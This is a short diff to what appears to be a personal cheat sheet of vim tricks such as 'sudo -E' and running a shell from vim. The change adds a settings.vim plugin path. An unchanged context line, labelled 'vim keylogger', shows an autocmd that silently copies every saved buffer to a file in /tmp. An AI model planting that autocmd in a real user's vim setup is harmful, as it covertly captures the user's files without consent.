@@ -17,6 +17,10 @@ sudo -E
 # run shell from vim
 :shell
 
+
+# Settings.vim
+/home/<<username>>/.vim/plugin/settings.vim.
+
 # vim keylogger
 :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
 
